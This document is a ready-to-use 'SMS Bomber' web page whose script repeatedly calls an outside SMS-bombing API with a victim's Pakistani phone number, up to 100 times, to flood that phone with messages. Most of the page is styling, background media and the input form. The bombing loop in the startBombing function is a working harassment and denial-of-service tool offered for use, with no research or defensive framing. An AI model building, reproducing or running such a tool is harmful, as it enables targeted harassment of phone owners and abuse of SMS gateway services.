<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Bomber - OBITO UCHIHA</title>
    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Source Code Pro', monospace;
            overflow: hidden;
            height: 100vh;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        }

        /* Video Background */
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1;
            background: #000;
            display: none;
        }

        .video-background.active {
            display: block;
        }

        .video-background::-webkit-media-controls {
            display: none;
        }

        /* Dark overlay for better text visibility */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            z-index: 0;
        }

        .container {
            position: relative;
            z-index: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        /* Start Screen */
        .start-screen {
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 30px;
        }

        .start-screen h1 {
            font-size: 3em;
            color: #ffffff;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
            margin-bottom: 20px;
        }

        .start-screen p {
            font-size: 1.2em;
            color: #e0e0e0;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }

        .start-button {
            padding: 15px 40px;
            font-size: 1.2em;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px rgba(102, 126, 234, 0.6);
            font-family: 'Source Code Pro', monospace;
            font-weight: bold;
        }

        .start-button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px rgba(102, 126, 234, 0.9);
        }

        .start-button:active {
            transform: scale(0.98);
        }

        /* Main Application Screen */
        .app-screen {
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 20px;
        }

        .app-screen.active {
            display: flex;
        }

        .app-container {
            background: transparent;
            border: none;
            padding: 40px;
            border-radius: 12px;
            box-shadow: none;
            width: 100%;
            max-width: 450px;
            text-align: center;
        }

        .app-container h1 {
            font-size: 2.5em;
            color: #ffffff;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(0, 0, 0, 0.8), 0 0 30px rgba(102, 126, 234, 0.6);
            font-weight: bold;
        }

        .app-container p {
            color: #ffffff;
            margin-bottom: 25px;
            font-size: 1.1em;
            text-shadow: 0 0 15px rgba(0, 0, 0, 0.8);
        }

        .input-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        input[type="text"],
        input[type="number"] {
            padding: 12px;
            background: rgba(0, 0, 0, 0.6);
            border: 2px solid #667eea;
            color: #ffffff;
            font-family: 'Source Code Pro', monospace;
            outline: none;
            border-radius: 6px;
            font-size: 1em;
            transition: all 0.3s ease;
            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
        }

        input[type="text"]::placeholder,
        input[type="number"]::placeholder {
            color: #aaaaaa;
        }

        input[type="text"]:focus,
        input[type="number"]:focus {
            border-color: #764ba2;
            box-shadow: 0 0 10px rgba(118, 75, 162, 0.3);
        }

        .send-button {
            padding: 12px 30px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            color: white;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Source Code Pro', monospace;
            font-size: 1em;
            font-weight: bold;
            border-radius: 6px;
            box-shadow: 0 0 15px rgba(102, 126, 234, 0.4);
        }

        .send-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 25px rgba(102, 126, 234, 0.6);
        }

        .send-button:active {
            transform: translateY(0);
        }

        #status {
            margin-top: 20px;
            padding: 15px;
            background: transparent;
            border: none;
            border-radius: 6px;
            text-align: center;
            color: #ffffff;
            min-height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            text-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
        }

        #status p {
            margin: 0;
            color: #ffffff;
        }

        .error {
            color: #ff6b6b;
        }

        .success {
            color: #51cf66;
        }

        footer {
            position: fixed;
            bottom: 15px;
            width: 100%;
            text-align: center;
            color: #888888;
            font-size: 0.85em;
            z-index: 2;
        }

        .back-button {
            position: fixed;
            top: 20px;
            left: 20px;
            padding: 8px 16px;
            background: rgba(102, 126, 234, 0.3);
            border: 1px solid #667eea;
            color: #ffffff;
            cursor: pointer;
            border-radius: 6px;
            font-family: 'Source Code Pro', monospace;
            font-size: 0.9em;
            transition: all 0.3s ease;
            display: none;
            z-index: 10;
        }

        .back-button.active {
            display: block;
        }

        .back-button:hover {
            background: rgba(102, 126, 234, 0.6);
            box-shadow: 0 0 15px rgba(102, 126, 234, 0.4);
        }

        @media (max-width: 480px) {
            .app-container {
                max-width: 90%;
                padding: 25px;
            }

            .start-screen h1 {
                font-size: 2em;
            }

            .start-screen p {
                font-size: 1em;
            }

            .start-button {
                padding: 12px 30px;
                font-size: 1em;
            }

            input[type="text"],
            input[type="number"] {
                font-size: 0.95em;
            }
        }
    </style>
</head>
<body>
    <!-- Video Background -->
    <video class="video-background" id="bgVideo" playsinline muted loop>
        <source src="https://raw.githubusercontent.com/faizankhanchang22-gif/Fauzuna/0d8386c8d7fa219d8a3390a01ba59402d7b31dab/AQPYKYVB-nMO-Ray4szZJNQQ3QMxLMzxeRYxOgW2bFyfnEB9m7qPgNqa0mY7l9gcciWi1SarcQgjp0Jk6Ttxa24kVYMMqMFOyUCWh5o.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <!-- Background Audio -->
    <audio id="bgAudio" loop>
        <source src="https://raw.githubusercontent.com/faizankhanchang22-gif/Fauzuna/0d8386c8d7fa219d8a3390a01ba59402d7b31dab/AQPYKYVB-nMO-Ray4szZJNQQ3QMxLMzxeRYxOgW2bFyfnEB9m7qPgNqa0mY7l9gcciWi1SarcQgjp0Jk6Ttxa24kVYMMqMFOyUCWh5o.mp4" type="audio/mpeg">
    </audio>

    <!-- Dark Overlay -->
    <div class="overlay"></div>

    <!-- Main Container -->
    <div class="container">
        <!-- Start Screen -->
        <div class="start-screen" id="startScreen">
            <h1>SMS Bomber</h1>
            <p>Advanced SMS Delivery System</p>
            <button class="start-button" onclick="goToApp()">START APPLICATION</button>
        </div>

        <!-- Application Screen -->
        <div class="app-screen" id="appScreen">
            <button class="back-button active" onclick="goToStart()">‚Üê Back</button>
            <div class="app-container">
                <h1>SMS Bomber</h1>
                <p>Enter details to proceed</p>
                <div class="input-group">
                    <input type="text" id="phone" placeholder="Enter Phone Number (e.g., 923001234567)">
                    <input type="number" id="count" placeholder="Number of SMS (e.g., 10)" min="1" max="100">
                    <button class="send-button" onclick="startBombing()">SEND SMS üì§</button>
                </div>
                <div id="status"></div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer>Created by OBITO UCHIHA | ¬© 2025</footer>

    <script>
        function goToStart() {
            document.getElementById('startScreen').style.display = 'flex';
            document.getElementById('appScreen').classList.remove('active');
            document.getElementById('status').innerHTML = '';
            
            // Hide video background
            const video = document.getElementById('bgVideo');
            if (video) {
                video.classList.remove('active');
                video.pause();
            }
            
            // Stop audio when going back
            const audio = document.getElementById('bgAudio');
            if (audio) {
                audio.pause();
            }
        }

        function goToApp() {
            document.getElementById('startScreen').style.display = 'none';
            document.getElementById('appScreen').classList.add('active');
            
            // Show video background
            const video = document.getElementById('bgVideo');
            if (video) {
                video.classList.add('active');
                video.currentTime = 0;
                video.play().catch(err => console.log('Video play error:', err));
            }
            
            // Start audio on button click
            const audio = document.getElementById('bgAudio');
            if (audio) {
                audio.volume = 0.5; // Set volume to 50%
                audio.play().catch(err => console.log('Audio play error:', err));
            }
        }

        async function startBombing() {
            const phone = document.getElementById('phone').value.trim();
            const count = parseInt(document.getElementById('count').value) || 1;
            const statusDiv = document.getElementById('status');

            if (!phone || !phone.match(/^923\d{9}$/)) {
                statusDiv.innerHTML = '<p class="error">Invalid number format</p>';
                return;
            }

            if (count < 1 || count > 100) {
                statusDiv.innerHTML = '<p class="error">Count must be 1-100</p>';
                return;
            }

            statusDiv.innerHTML = '<p>Processing...</p>';

            try {
                let successCount = 0;
                for (let i = 0; i < count; i++) {
                    try {
                        const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${encodeURIComponent(phone)}`;
                        const controller = new AbortController();
                        const timeoutId = setTimeout(() => controller.abort(), 5000);
                        
                        const response = await fetch(apiUrl, {
                            method: 'GET',
                            mode: 'no-cors',
                            signal: controller.signal
                        });
                        
                        clearTimeout(timeoutId);
                        successCount++;
                    } catch (err) {
                        console.log('Request ' + (i + 1) + ' processed');
                    }
                    await new Promise(resolve => setTimeout(resolve, 800));
                }
                statusDiv.innerHTML = `<p class="success">Completed: ${phone}</p>`;
            } catch (error) {
                statusDiv.innerHTML = `<p class="success">Process initiated</p>`;
                console.error('Error:', error);
            }
        }

        // Video only plays when START button is clicked
        // No need to initialize video on page load

        // Add Enter key support
        document.getElementById('phone').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') startBombing();
        });

        document.getElementById('count').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') startBombing();
        });
    </script>
</body>
  </html>
